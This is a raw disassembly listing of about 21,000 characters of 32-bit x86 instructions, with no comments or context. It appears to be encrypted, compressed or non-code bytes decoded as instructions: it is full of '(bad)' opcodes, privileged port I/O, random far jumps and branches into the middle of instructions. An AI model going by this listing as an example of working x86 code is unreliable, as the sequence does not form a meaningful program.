  41bbac:	jae    0x41bbff
  41bbae:	ret    
  41bbaf:	dec    edi
  41bbb0:	sub    cl,ah
  41bbb2:	popa   
  41bbb3:	mov    WORD PTR [ebx],ds
  41bbb5:	xlat   BYTE PTR ds:[ebx]
  41bbb6:	mov    bl,0xd0
  41bbb8:	fild   QWORD PTR [ecx]
  41bbba:	fwait
  41bbbb:	repnz cwde 
  41bbbd:	or     eax,0x56abefa2
  41bbc2:	test   eax,0xb81e7dd8
  41bbc7:	fldcw  WORD PTR [ecx-0x77]
  41bbca:	dec    ebp
  41bbcb:	dec    ebx
  41bbcc:	arpl   WORD PTR [ecx-0x2a],bp
  41bbcf:	push   0x83a9dec0
  41bbd4:	xchg   ebx,eax
  41bbd5:	nop
  41bbd6:	loop   0x41bb80
  41bbd8:	xlat   BYTE PTR ds:[ebx]
  41bbd9:	mov    ch,0x44
  41bbdb:	cmp    ecx,DWORD PTR [edi]
  41bbdd:	rol    BYTE PTR [edx+0x19],cl
  41bbe0:	hlt    
  41bbe1:	mov    dl,ah
  41bbe3:	stos   BYTE PTR es:[edi],al
  41bbe4:	sub    dl,bh
  41bbe6:	sbb    edi,DWORD PTR [eax]
  41bbe8:	into   
  41bbe9:	fdivr  DWORD PTR [esi-0x25]
  41bbec:	aad    0xd0
  41bbee:	mov    ebx,0xf30403a0
  41bbf3:	mov    ch,0x3f
  41bbf5:	sbb    BYTE PTR [ebx-0x27fffe0a],bh
  41bbfb:	mov    WORD PTR [eax],?
  41bbfd:	inc    edx
  41bbfe:	sub    esi,DWORD PTR [edx]
  41bc00:	sbb    ch,BYTE PTR [ebp-0x381ef6aa]
  41bc06:	jno    0x41bbd8
  41bc08:	out    0x6f,eax
  41bc0a:	icebp  
  41bc0b:	retf   
  41bc0c:	lea    ebx,[eax-0xfdee39f]
  41bc12:	jno    0x41bc2d
  41bc14:	push   ebp
  41bc15:	repz add al,0x15
  41bc18:	popf   
  41bc19:	div    DWORD PTR [eax]
  41bc1b:	cmp    DWORD PTR [eax+0x3b],esp
  41bc1e:	push   eax
  41bc1f:	lods   al,BYTE PTR ds:[esi]
  41bc20:	sub    edi,DWORD PTR [esi-0xe45fe92]
  41bc26:	xor    BYTE PTR [ecx],0x3a
  41bc29:	jns    0x41bc57
  41bc2b:	mov    bh,BYTE PTR [esi+0x47875e10]
  41bc31:	inc    edi
  41bc32:	stos   BYTE PTR es:[edi],al
  41bc33:	mov    ch,0xea
  41bc35:	inc    edx
  41bc36:	dec    ebp
  41bc37:	ss fsubr st(3),st
  41bc3a:	pop    ebx
  41bc3b:	add    al,0x95
  41bc3d:	jl     0x41bbcd
  41bc3f:	and    al,0xe9
  41bc41:	push   es
  41bc42:	icebp  
  41bc43:	sub    eax,0x995abd83
  41bc48:	in     eax,dx
  41bc49:	jp     0x41bc54
  41bc4b:	push   0xffffff83
  41bc4d:	xchg   edx,eax
  41bc4e:	sub    ecx,DWORD PTR [ecx]
  41bc50:	mov    BYTE PTR [ecx-0x1bad9e68],dh
  41bc56:	pop    ds
  41bc57:	repnz mov dl,0x7
  41bc5a:	dec    edx
  41bc5b:	dec    edi
  41bc5c:	jmp    0xb0c1:0xcada61f3
  41bc63:	dec    edi
  41bc64:	adc    bl,BYTE PTR [esi+0x457389e0]
  41bc6a:	mov    BYTE PTR ds:0x2d5e458,dl
  41bc70:	xchg   DWORD PTR [esi],ecx
  41bc72:	xor    cl,BYTE PTR [ebx-0x1f9f67e0]
  41bc78:	pop    edx
  41bc79:	mov    dh,0x11
  41bc7b:	imul   esp,DWORD PTR [edi+0x1224128f],0x41b39ae8
  41bc85:	pop    edi
  41bc86:	test   BYTE PTR [ecx-0x69],al
  41bc89:	or     DWORD PTR [ecx+0x565c9fe3],0xffffffc8
  41bc90:	adc    al,0xd
  41bc92:	loope  0x41bc20
  41bc94:	lahf   
  41bc95:	push   ebx
  41bc96:	dec    ebx
  41bc97:	pop    ebp
  41bc98:	mov    ebp,0xd9e59213
  41bc9d:	adc    esp,DWORD PTR ss:[ebp+eiz*4+0x41]
  41bca2:	mov    ebx,0x8d5032b9
  41bca7:	pop    ss
  41bca8:	cmp    eax,edx
  41bcaa:	scas   eax,DWORD PTR es:[edi]
  41bcab:	test   al,dh
  41bcad:	(bad)  
  41bcae:	test   eax,0x4e474775
  41bcb3:	push   0xb
  41bcb5:	lods   eax,DWORD PTR ds:[esi]
  41bcb6:	mov    ds:0xd3c43cce,al
  41bcbb:	repnz (bad) 
  41bcbd:	jo     0x41bca6
  41bcbf:	in     al,dx
  41bcc0:	mov    esi,0xf79353b1
  41bcc5:	stos   BYTE PTR es:[edi],al
  41bcc6:	stos   BYTE PTR es:[edi],al
  41bcc7:	loope  0x41bcba
  41bcc9:	push   edi
  41bcca:	xchg   ebp,eax
  41bccb:	stos   BYTE PTR es:[edi],al
  41bccc:	push   ds
  41bccd:	push   ecx
  41bcce:	inc    ebp
  41bccf:	push   edi
  41bcd0:	call   0x1086:0x1e2106d3
  41bcd7:	and    al,0xe0
  41bcd9:	pop    ebp
  41bcda:	xchg   esp,eax
  41bcdb:	or     al,0x25
  41bcdd:	mov    ds:0xc26f91ef,eax
  41bce2:	stc    
  41bce3:	mov    dl,0x5a
  41bce5:	pushf  
  41bce6:	into   
  41bce7:	pushf  
  41bce8:	sub    esi,ebp
  41bcea:	jae    0x41bd4e
  41bcec:	fld    DWORD PTR [esi+0x673de35a]
  41bcf2:	adc    BYTE PTR [esi+0x7345180d],cl
  41bcf8:	mov    al,0xf7
  41bcfa:	mov    dh,0xd0
  41bcfc:	push   es
  41bcfd:	push   es
  41bcfe:	mov    cs,WORD PTR [ebp+0x6146612c]
  41bd04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd05:	mov    bl,bl
  41bd07:	cmp    eax,0x270a0771
  41bd0c:	or     al,0x2
  41bd0e:	in     eax,dx
  41bd0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd10:	adc    eax,0x38f26f87
  41bd15:	push   0x44e1c7dc
  41bd1a:	push   edi
  41bd1b:	test   eax,0x5c9f6f4e
  41bd20:	mov    esi,0x90de2e2c
  41bd25:	sub    bl,bh
  41bd27:	xchg   BYTE PTR [ecx],bl
  41bd29:	or     eax,0xeaf9e80f
  41bd2e:	mov    DWORD PTR [ebp+0x5c],esp
  41bd31:	int    0x8
  41bd33:	daa    
  41bd34:	or     eax,0x77e5fa4c
  41bd39:	inc    ebx
  41bd3a:	pop    eax
  41bd3b:	mov    al,ds:0x8284a165
  41bd40:	arpl   WORD PTR [edx+0x66],bx
  41bd43:	js     0x41bd76
  41bd45:	(bad)  [esi-0x139f83a5]
  41bd4b:	retf   
  41bd4c:	xor    eax,0x35ccce06
  41bd51:	enter  0x575e,0xbe
  41bd55:	inc    edx
  41bd56:	lds    ebx,FWORD PTR [ebp+esi*2+0xca164a1]
  41bd5d:	cmp    al,0xc0
  41bd5f:	mov    dl,0x5a
  41bd61:	leave  
  41bd62:	outs   dx,BYTE PTR ds:[esi]
  41bd63:	lea    esp,[ebx+ecx*8]
  41bd66:	ficomp DWORD PTR [ebx-0x38]
  41bd69:	lahf   
  41bd6a:	fcom   QWORD PTR ds:0x506aae5b
  41bd70:	jg     0x41bd2b
  41bd72:	loop   0x41bd68
  41bd74:	xor    eax,0xf31111fe
  41bd79:	inc    ebp
  41bd7a:	push   eax
  41bd7b:	push   esi
  41bd7c:	mov    ecx,0xa2dec2e3
  41bd81:	rcl    DWORD PTR [ecx+ebx*1+0x37],cl
  41bd85:	stc    
  41bd86:	scas   al,BYTE PTR es:[edi]
  41bd87:	and    ebx,DWORD PTR [edx+0x5d9490fe]
  41bd8d:	sbb    eax,0xf191335c
  41bd92:	out    dx,al
  41bd93:	into   
  41bd94:	mov    ds:0xb60866a8,eax
  41bd99:	inc    ecx
  41bd9a:	not    edx
  41bd9c:	jo     0x41bd9d
  41bd9e:	push   ss
  41bd9f:	aas    
  41bda0:	es sbb al,0xa9
  41bda3:	sbb    dl,dl
  41bda5:	call   0x2d50:0x3b043f6
  41bdac:	mov    esp,0x777ae808
  41bdb1:	jns    0x41be26
  41bdb3:	and    DWORD PTR ds:0xf1996489,esi
  41bdb9:	xor    eax,ecx
  41bdbb:	push   edi
  41bdbc:	sahf   
  41bdbd:	aad    0xf9
  41bdbf:	mov    ebx,0x4c98d89f
  41bdc4:	sbb    al,0xae
  41bdc6:	pushf  
  41bdc7:	mov    ds:0x7e385e98,al
  41bdcc:	or     BYTE PTR [ecx+0x40],bh
  41bdcf:	mov    esp,0xd78364e8
  41bdd4:	push   cs
  41bdd5:	jmp    0xc5b7f0ab
  41bdda:	or     DWORD PTR [edi-0x3449bb9a],edx
  41bde0:	ret    0x7d63
  41bde3:	jge    0x41bd7e
  41bde5:	mov    esp,0xbbff345
  41bdea:	sub    cl,BYTE PTR [ebx+0x3cdb8c6d]
  41bdf0:	mov    esp,0xa0113589
  41bdf5:	js     0x41be72
  41bdf7:	mov    dl,0xf4
  41bdf9:	xlat   BYTE PTR ds:[ebx]
  41bdfa:	fcomp  DWORD PTR [esi+0x4339b3e2]
  41be00:	sbb    BYTE PTR [ecx],0xc9
  41be03:	sub    DWORD PTR [ecx],0xaed5908e
  41be09:	lods   al,BYTE PTR ds:[esi]
  41be0a:	xchg   esi,eax
  41be0b:	xchg   esp,eax
  41be0c:	cdq    
  41be0d:	scas   al,BYTE PTR es:[edi]
  41be0e:	mov    eax,0x160c9aab
  41be13:	xchg   ebp,eax
  41be14:	pushf  
  41be15:	dec    edx
  41be16:	rcl    ch,0x30
  41be19:	mov    ds:0xb964c043,eax
  41be1e:	test   eax,0x813e4a57
  41be23:	inc    edx
  41be24:	sbb    ah,BYTE PTR [eax+0x361162d2]
  41be2a:	lods   eax,DWORD PTR ds:[esi]
  41be2b:	cmp    BYTE PTR ds:[eax+0x8880525],0xa7
  41be33:	ds jo  0x41bea3
  41be36:	retf   0xaab
  41be39:	inc    ebp
  41be3a:	(bad)
  41be3d:	gs jl  0x41be01
  41be40:	sbb    BYTE PTR [esi+0x52],ah
  41be43:	test   al,0xb8
  41be45:	xchg   ebx,eax
  41be46:	sar    BYTE PTR ds:0xfddd6757,0x9a
  41be4d:	xchg   edx,eax
  41be4e:	mov    al,0xdf
  41be50:	mov    edi,0x1249c7a
  41be55:	iret   
  41be56:	rol    esp,1
  41be58:	or     ebp,ecx
  41be5a:	inc    edx
  41be5b:	or     eax,0xa78caf0c
  41be60:	ins    DWORD PTR es:[edi],dx
  41be61:	fs sub dh,cl
  41be64:	imul   ebx,eax,0xaa09bfbc
  41be6a:	jnp    0x41be85
  41be6c:	jmp    0x41bec6
  41be6e:	cmp    eax,0x9cbf96ed
  41be73:	or     BYTE PTR ds:0xf912d06b,0x13
  41be7a:	xor    eax,0x4adb2c3c
  41be7f:	sub    DWORD PTR [edi],esp
  41be81:	bound  edi,QWORD PTR [eax+edx*4+0x4ef79e0c]
  41be88:	inc    edx
  41be89:	ja     0x41be8c
  41be8b:	daa    
  41be8c:	sahf   
  41be8d:	or     al,BYTE PTR [ebx+0x49845818]
  41be93:	loop   0x41bea5
  41be95:	pop    ss
  41be96:	push   ecx
  41be97:	xchg   edx,eax
  41be98:	push   0xb015956c
  41be9d:	adc    BYTE PTR [edi-0x50c169c3],0x7b
  41bea4:	arpl   WORD PTR [edi],cx
  41bea6:	je     0x41be3b
  41bea8:	push   ds
  41bea9:	mov    gs,WORD PTR [esi+0x5]
  41beac:	dec    esi
  41bead:	loope  0x41bee5
  41beaf:	push   cs
  41beb0:	xchg   esi,eax
  41beb1:	add    esi,DWORD PTR [esp+eiz*4]
  41beb4:	xchg   edx,eax
  41beb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41beb6:	es loopne 0x41bee7
  41beb9:	sahf   
  41beba:	cmc    
  41bebb:	retf   0xede5
  41bebe:	loopne 0x41bf3c
  41bec0:	outs   dx,BYTE PTR ds:[esi]
  41bec1:	in     al,0xc3
  41bec3:	inc    ebx
  41bec4:	and    ch,0x5
  41bec7:	addr16 jns 0x41bf17
  41beca:	add    bh,BYTE PTR [edi+0x3097725]
  41bed0:	arpl   WORD PTR [esi-0x15],bp
  41bed3:	dec    ebx
  41bed4:	inc    ebp
  41bed5:	cld    
  41bed6:	mov    ebx,0xf8a42981
  41bedb:	in     al,0xa9
  41bedd:	es fcmovne st,st(5)
  41bee0:	(bad)  
  41bee1:	es call 0x517557c6
  41bee7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bee8:	loop   0x41beb5
  41beea:	sub    DWORD PTR [esi],0xffffffcc
  41beed:	ror    ah,1
  41beef:	int3   
  41bef0:	pop    ebp
  41bef1:	(bad)  
  41bef2:	cld    
  41bef3:	jmp    0x41bf6b
  41bef5:	xor    DWORD PTR [edx+0x2e],ebp
  41bef8:	das    
  41bef9:	rcr    BYTE PTR [esi+ecx*2+0x60d63d17],cl
  41bf00:	sbb    eax,0xc50c640c
  41bf05:	rcr    WORD PTR [edx+0x5a],0xd4
  41bf0a:	mov    esi,0xdc4066d3
  41bf0f:	stos   BYTE PTR es:[edi],al
  41bf10:	test   DWORD PTR ds:0xe03b6fb5,esp
  41bf16:	push   esp
  41bf17:	fdiv   QWORD PTR [ecx-0x4e]
  41bf1a:	out    dx,al
  41bf1b:	xor    ch,ah
  41bf1d:	shl    al,1
  41bf1f:	push   edx
  41bf20:	iret   
  41bf21:	jp     0x41beee
  41bf23:	or     ch,BYTE PTR [esi+0x26a1bcfb]
  41bf29:	test   BYTE PTR [ebx+0x456c7dcb],0x42
  41bf30:	xor    edx,DWORD PTR [eax-0x68]
  41bf33:	aas    
  41bf34:	or     ecx,DWORD PTR [esi+0x7c]
  41bf37:	leave  
  41bf38:	div    DWORD PTR [esi]
  41bf3a:	dec    ebx
  41bf3b:	ins    DWORD PTR es:[edi],dx
  41bf3c:	fcom   DWORD PTR [edi+0x3809209f]
  41bf42:	jmp    0x6017:0x3f8b5615
  41bf49:	addr16 inc esi
  41bf4b:	jne    0x41bf3e
  41bf4d:	sbb    cl,0x5d
  41bf50:	pop    edi
  41bf51:	pop    edi
  41bf52:	loopne 0x41bf31
  41bf54:	or     al,0x24
  41bf56:	add    eax,0x95dd5daa
  41bf5b:	gs mov cl,0x75
  41bf5e:	cmp    ebp,ebx
  41bf60:	cmp    ecx,0x90295ec0
  41bf66:	inc    ebx
  41bf67:	test   al,0x92
  41bf69:	xlat   BYTE PTR ds:[ebx]
  41bf6a:	cld    
  41bf6b:	in     al,dx
  41bf6c:	dec    eax
  41bf6d:	mov    al,0xc3
  41bf6f:	(bad)  
  41bf70:	adc    BYTE PTR [edx-0xf117978],bh
  41bf76:	push   0xfffffff7
  41bf78:	(bad)  
  41bf79:	mov    al,0xce
  41bf7b:	not    BYTE PTR [esp+ebx*2+0x19]
  41bf7f:	mov    eax,0x40f83acf
  41bf84:	mov    ebx,0x391425fa
  41bf89:	retw   0xb225
  41bf8d:	add    BYTE PTR [ebx],dl
  41bf8f:	stos   DWORD PTR es:[edi],eax
  41bf90:	and    dh,BYTE PTR [edx+eiz*4-0x1e3c02ce]
  41bf97:	je     0x41bffa
  41bf99:	call   0x102f:0x51b47bc1
  41bfa0:	out    0xda,eax
  41bfa2:	sbb    al,0xaf
  41bfa4:	mov    ah,0xc6
  41bfa6:	outs   dx,DWORD PTR ds:[esi]
  41bfa7:	jbe    0x41bfab
  41bfa9:	js     0x41bf40
  41bfab:	outs   dx,DWORD PTR ds:[esi]
  41bfac:	xchg   esp,eax
  41bfad:	in     al,0x9a
  41bfaf:	push   es
  41bfb0:	mov    cl,0xcc
  41bfb2:	shr    esp,1
  41bfb4:	fs push cs
  41bfb6:	adc    eax,0x15834f2f
  41bfbb:	in     eax,dx
  41bfbc:	lea    ebp,[ebx+ecx*1]
  41bfbf:	push   eax
  41bfc0:	test   al,0x51
  41bfc2:	and    ebp,DWORD PTR [esi-0x65]
  41bfc5:	pusha  
  41bfc6:	inc    eax
  41bfc7:	mov    ebx,0xe011d991
  41bfcc:	data16 out dx,al
  41bfce:	loopne 0x41bf5f
  41bfd0:	aas    
  41bfd1:	push   eax
  41bfd2:	jp     0x41bf62
  41bfd4:	cmc    
  41bfd5:	call   0x742d275c
  41bfda:	adc    al,0xc5
  41bfdc:	push   eax
  41bfdd:	es xor eax,0xf7dfc1ac
  41bfe3:	xchg   edi,eax
  41bfe4:	lods   al,BYTE PTR ds:[esi]
  41bfe5:	inc    eax
  41bfe6:	cmp    DWORD PTR [esp+edi*4-0x3c5c78f4],0x76
  41bfee:	adc    cl,BYTE PTR [esi-0x7555e3a2]
  41bff4:	scas   al,BYTE PTR es:[edi]
  41bff5:	or     DWORD PTR [edi-0x5953bc88],0xfffffff1
  41bffc:	sub    DWORD PTR [esi+ebp*4+0x40],ecx
  41c000:	cmp    BYTE PTR [edi+0x512655a2],cl
  41c006:	shl    edx,0xc3
  41c009:	push   ds
  41c00a:	rcl    BYTE PTR [edx-0x24a3a50e],1
  41c010:	dec    DWORD PTR [edx]
  41c012:	ins    DWORD PTR es:[edi],dx
  41c013:	adc    esp,DWORD PTR [edx-0x4ffb0024]
  41c019:	push   edx
  41c01a:	call   0xf0ee:0x3f97a197
  41c021:	pop    edx
  41c022:	cmc    
  41c023:	dec    edi
  41c024:	jae    0x41c05b
  41c026:	mov    ah,0x6d
  41c028:	mov    ds:0x168f46e7,al
  41c02d:	adc    BYTE PTR [ecx-0x6807daab],ch
  41c033:	dec    esi
  41c034:	cmp    DWORD PTR [eax],eax
  41c036:	fld    DWORD PTR [ebx+0x74]
  41c039:	add    al,0x39
  41c03b:	and    esp,DWORD PTR [esi]
  41c03d:	xchg   ebx,eax
  41c03e:	mov    bl,0x6c
  41c040:	rcl    al,1
  41c042:	inc    edi
  41c043:	push   ds
  41c044:	add    eax,0x8e63030c
  41c049:	and    edi,0xfffffff2
  41c04c:	xchg   ebp,eax
  41c04d:	mov    edx,0x57e7ffb1
  41c052:	sub    BYTE PTR ds:0x62994ead,al
  41c058:	(bad)  
  41c059:	lock jmp 0x41c030
  41c05c:	repz retf 
  41c05e:	pushf  
  41c05f:	dec    edi
  41c060:	mov    ds:0xa168a2da,eax
  41c065:	dec    eax
  41c066:	(bad)  
  41c067:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c068:	mov    ah,0x31
  41c06a:	aam    0x9e
  41c06c:	ins    DWORD PTR es:[edi],dx
  41c06d:	fimul  DWORD PTR [edx-0x67861750]
  41c073:	es push ss
  41c075:	xchg   esi,eax
  41c076:	test   ah,dl
  41c078:	jmp    0x41c07b
  41c07a:	das    
  41c07b:	das    
  41c07c:	test   al,0x3c
  41c07e:	and    eax,0x74902ab6
  41c083:	pop    edx
  41c084:	jno    0x41c021
  41c086:	mov    gs,WORD PTR [eax]
  41c088:	cmp    DWORD PTR [edx],0x13
  41c08b:	enter  0xa8ed,0x8d
  41c08f:	push   eax
  41c090:	sub    eax,0xba89f5a2
  41c095:	test   BYTE PTR ss:0xfbed2f47,ch
  41c09c:	rcl    BYTE PTR [esi+0x784ab151],0x19
  41c0a3:	imul   esp,DWORD PTR [eax+0x4c],0xffffff91
  41c0a7:	pop    esi
  41c0a8:	cdq    
  41c0a9:	jo     0x41c060
  41c0ab:	popa   
  41c0ac:	sbb    BYTE PTR [edi+0x20],0x55
  41c0b0:	int3   
  41c0b1:	mov    eax,ds:0xe4be142a
  41c0b6:	sub    esp,DWORD PTR [edi-0x56]
  41c0b9:	test   DWORD PTR [edx+0x1f6afb6d],esp
  41c0bf:	aaa    
  41c0c0:	add    eax,0x52af10ec
  41c0c5:	push   0xb5407d45
  41c0ca:	cmp    BYTE PTR [edi],cl
  41c0cc:	loop   0x41c0f5
  41c0ce:	add    ah,BYTE PTR [ebx-0x3b]
  41c0d1:	ds jne 0x41c0f0
  41c0d4:	pop    es
  41c0d5:	sub    DWORD PTR [esi],eax
  41c0d7:	inc    esi
  41c0d8:	mov    eax,ds:0x88c29f07
  41c0dd:	adc    dl,bh
  41c0df:	das    
  41c0e0:	adc    eax,0x14536f8b
  41c0e5:	mov    dh,0x6f
  41c0e7:	pop    esp
  41c0e8:	repnz into 
  41c0ea:	mov    dl,0xb8
  41c0ec:	or     al,0xed
  41c0ee:	sub    ecx,DWORD PTR [edi-0x292c2fc9]
  41c0f4:	add    DWORD PTR [esi+0x63],ecx
  41c0f7:	lea    esp,[ebx-0x54126d21]
  41c0fd:	sti    
  41c0fe:	lea    esp,[eax+ecx*2+0x11a9867c]
  41c105:	and    al,BYTE PTR [ebp-0x77]
  41c108:	inc    edi
  41c109:	sbb    BYTE PTR [eax-0x98b5459],bl
  41c10f:	ret    
  41c110:	sub    BYTE PTR gs:[ecx],cl
  41c113:	pop    edi
  41c114:	popf   
  41c115:	test   al,0x73
  41c117:	adc    DWORD PTR [edx-0x7],edi
  41c11a:	sbb    BYTE PTR [edx+0x48],al
  41c11d:	out    dx,eax
  41c11e:	shl    DWORD PTR [ebx],1
  41c120:	add    edx,edi
  41c122:	hlt    
  41c123:	sub    eax,0xc55dcfbe
  41c128:	add    BYTE PTR [edi],bl
  41c12a:	imul   esi,DWORD PTR [esi+edx*2+0x46b891ef],0x441689b9
  41c135:	xor    BYTE PTR [esp+edi*1+0x59],0xaa
  41c13a:	lods   al,BYTE PTR ds:[esi]
  41c13b:	enter  0x977b,0xcf
  41c13f:	dec    ebx
  41c140:	pop    esi
  41c141:	test   DWORD PTR [edi+ecx*2+0x4ac41239],esi
  41c148:	mov    ch,BYTE PTR [edi+0x52da4c14]
  41c14e:	mov    dh,0xf1
  41c150:	leave  
  41c151:	adc    BYTE PTR [edx],0xd6
  41c154:	pop    ss
  41c155:	mov    al,0xb
  41c157:	popf   
  41c158:	xlat   BYTE PTR ds:[ebx]
  41c159:	jl     0x41c14a
  41c15b:	sar    DWORD PTR [esi-0x5],0x24
  41c15f:	mov    ecx,fs
  41c161:	sub    dl,dl
  41c163:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c164:	(bad)  [edi+eiz*4+0x63989382]
  41c16b:	dec    ebp
  41c16c:	aaa    
  41c16d:	push   ds
  41c16e:	mov    ah,0x95
  41c170:	jecxz  0x41c14b
  41c172:	or     eax,DWORD PTR [esi+eax*8-0x31396f3]
  41c179:	sub    eax,0x34aa1b9a
  41c17e:	sbb    cl,BYTE PTR [eax-0x48]
  41c181:	xchg   ebx,eax
  41c182:	cld    
  41c183:	mov    dl,0x29
  41c185:	add    dl,BYTE PTR [ecx+eax*4+0x2e]
  41c189:	(bad)  
  41c18a:	dec    ebp
  41c18b:	div    BYTE PTR [eax+0x77]
  41c18e:	jne    0x41c153
  41c190:	bound  ebp,QWORD PTR [edx+0x7f]
  41c193:	(bad)  
  41c194:	jnp    0x41c138
  41c196:	jmp    0xb3284af7
  41c19b:	popa   
  41c19c:	cmp    ah,BYTE PTR [ebx+0x59dadc99]
  41c1a2:	shl    BYTE PTR [edi-0x738ea5a9],1
  41c1a8:	sbb    al,0x3e
  41c1aa:	and    BYTE PTR [ebp-0x635d4d54],bl
  41c1b0:	sahf   
  41c1b1:	(bad)  
  41c1b2:	ins    BYTE PTR es:[edi],dx
  41c1b3:	cmova  esi,edx
  41c1b6:	or     BYTE PTR [ebp-0x76],dl
  41c1b9:	xchg   ebp,eax
  41c1ba:	loop   0x41c181
  41c1bc:	inc    edi
  41c1bd:	jmp    0x177e:0x7206bc8b
  41c1c4:	dec    esi
  41c1c5:	xor    DWORD PTR [ebx-0x3c8300e6],esp
  41c1cb:	retf   
  41c1cc:	ins    DWORD PTR es:[edi],dx
  41c1cd:	adc    al,0xe5
  41c1d0:	push   edx
  41c1d1:	les    ebx,FWORD PTR [edx-0x24]
  41c1d4:	fimul  WORD PTR [esi+ecx*8]
  41c1d7:	pushf  
  41c1d8:	out    0x69,eax
  41c1da:	mov    cl,0xc7
  41c1dc:	pusha  
  41c1dd:	pop    ds
  41c1de:	nop
  41c1df:	xor    ebx,esi
  41c1e1:	je     0x41c231
  41c1e3:	das    
  41c1e4:	pop    edx
  41c1e5:	imul   ebx,ebp,0x53
  41c1e8:	xor    eax,0x2a93659f
  41c1ed:	ret    
  41c1ee:	in     al,dx
  41c1ef:	dec    edx
  41c1f0:	push   ebx
  41c1f1:	and    BYTE PTR [ecx-0x481fe153],0xf0
  41c1f8:	outs   dx,DWORD PTR ds:[esi]
  41c1f9:	outs   dx,BYTE PTR ds:[esi]
  41c1fa:	push   ebp
  41c1fb:	test   BYTE PTR [ebp+edx*8-0x27],ch
  41c1ff:	aaa    
  41c200:	and    al,0xfb
  41c202:	nop
  41c203:	pop    ecx
  41c204:	jb     0x41c1d3
  41c206:	push   es
  41c207:	out    dx,eax
  41c208:	mov    ebx,0xcbc4375a
  41c20d:	mov    edi,0xada03ef
  41c212:	xor    DWORD PTR cs:[ecx+0x7d763dab],0xe2a793df
  41c21d:	shl    DWORD PTR [edi],0xfe
  41c220:	loopne 0x41c1af
  41c222:	mov    WORD PTR [ecx+esi*2-0x39],?
  41c226:	push   esi
  41c227:	(bad)
  41c22b:	cmc    
  41c22c:	add    eax,0x7d0e7026
  41c231:	clc    
  41c232:	and    bh,BYTE PTR [ecx+0x1b3fb2cc]
  41c238:	pop    edi
  41c239:	mov    ecx,0x31698887
  41c23e:	push   0xffffff8a
  41c240:	or     edi,DWORD PTR [ebx]
  41c242:	inc    edi
  41c243:	or     al,0x92
  41c245:	aaa    
  41c246:	retf   
  41c247:	pop    ds
  41c248:	jecxz  0x41c296
  41c24a:	pop    esp
  41c24b:	jns    0x41c2bb
  41c24d:	test   BYTE PTR [edx-0x38],0xb7
  41c251:	mov    ah,0x4b
  41c253:	repz push ebx
  41c255:	mov    DWORD PTR [edx],edi
  41c257:	jb     0x41c296
  41c259:	out    0xac,al
  41c25b:	repz aad 0x52
  41c25e:	pop    ss
  41c25f:	add    WORD PTR [edi-0x1d],dx
  41c263:	mov    dh,BYTE PTR [ebx]
  41c265:	lea    edi,[esi+ecx*1-0x3dd51360]
  41c26c:	int    0x6a
  41c26e:	add    DWORD PTR [ebx+0x2f7a920f],esp
  41c274:	push   cs
  41c275:	xchg   ebx,eax
  41c276:	or     bh,al
  41c278:	sahf   
  41c279:	call   0xd58513ec
  41c27e:	ins    BYTE PTR es:[edi],dx
  41c27f:	(bad)  
  41c280:	rcl    BYTE PTR [esi-0x65],cl
  41c283:	or     esi,DWORD PTR [eax]
  41c285:	push   eax
  41c286:	jge    0x41c2d2
  41c288:	push   cs
  41c289:	mov    ebx,0x3e349124
  41c28e:	fadd   QWORD PTR [ecx-0x706dde11]
  41c294:	sub    dh,BYTE PTR [edx-0x7987575f]
  41c29a:	dec    esi
  41c29b:	and    eax,0xb50c2e60
  41c2a0:	cmp    al,0x2f
  41c2a2:	add    BYTE PTR [esi+ebx*1-0x4e],0x5f
  41c2a7:	shl    DWORD PTR [ecx-0x22a5e76e],1
  41c2ad:	(bad)  
  41c2ae:	or     al,0x72
  41c2b0:	pop    ecx
  41c2b1:	stc    
  41c2b2:	imul   edx,DWORD PTR [edx],0x47
  41c2b5:	mov    esp,0xd68b75dc
  41c2ba:	fwait
  41c2bb:	xor    DWORD PTR [ecx+0x1a546e97],ebp
  41c2c1:	pop    ebx
  41c2c2:	out    dx,eax
  41c2c3:	iret   
  41c2c4:	fimul  DWORD PTR [eax+0x2f237293]
  41c2ca:	sbb    al,0x5c
  41c2cc:	cmp    BYTE PTR [ecx+0x5be95fbe],cl
  41c2d2:	pop    es
  41c2d3:	xor    bl,BYTE PTR [edx+0xb7f4891]
  41c2d9:	push   0x98cb3f7c
  41c2de:	lock pushf 
  41c2e0:	stos   BYTE PTR es:[edi],al
  41c2e1:	sti    
  41c2e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2e3:	inc    edx
  41c2e4:	jge    0x41c362
  41c2e6:	test   eax,0xb30bee2c
  41c2eb:	cmp    dh,dl
  41c2ed:	cs je  0x41c316
  41c2f0:	sbb    DWORD PTR ds:0xef199c77,ecx
  41c2f6:	retf   
  41c2f7:	or     ah,bh
  41c2f9:	push   es
  41c2fa:	ins    BYTE PTR es:[edi],dx
  41c2fb:	mov    ah,0x97
  41c2fd:	addr16 in al,0x31
  41c300:	xchg   edi,eax
  41c301:	mov    edx,0x905841c8
  41c306:	bound  ecx,QWORD PTR [edx+0x8468fe8]
  41c30c:	test   al,0xbb
  41c30e:	shr    BYTE PTR [edi],0xd0
  41c311:	bound  ecx,QWORD PTR [ebp-0x5e]
  41c314:	adc    DWORD PTR [eax+0x67],eax
  41c317:	dec    ecx
  41c318:	add    ah,BYTE PTR [ebp+esi*4-0x4a]
  41c31c:	xor    al,0xb8
  41c31e:	push   ebp
  41c31f:	add    BYTE PTR [ebp+0x5b],0xc4
  41c323:	out    0x46,eax
  41c325:	xchg   ecx,eax
  41c326:	nop
  41c327:	mov    DWORD PTR cs:[eax-0x5c],ebx
  41c32b:	jge    0x41c383
  41c32d:	aad    0xf8
  41c32f:	mov    ebx,0x9ea32fa0
  41c334:	ss push cs
  41c336:	push   ebx
  41c337:	xor    BYTE PTR [eax-0x58952bac],ah
  41c33d:	cmp    edx,DWORD PTR [ebx-0x2b5ceb58]
  41c343:	fimul  DWORD PTR [edx]
  41c345:	push   edx
  41c346:	sub    esi,DWORD PTR [edx-0x1b05e71b]
  41c34c:	scas   eax,DWORD PTR es:[edi]
  41c34d:	scas   eax,DWORD PTR es:[edi]
  41c34e:	fstp   TBYTE PTR [esi+0x5798a79a]
  41c354:	pop    ds
  41c355:	mov    ch,0x69
  41c357:	je     0x41c378
  41c359:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
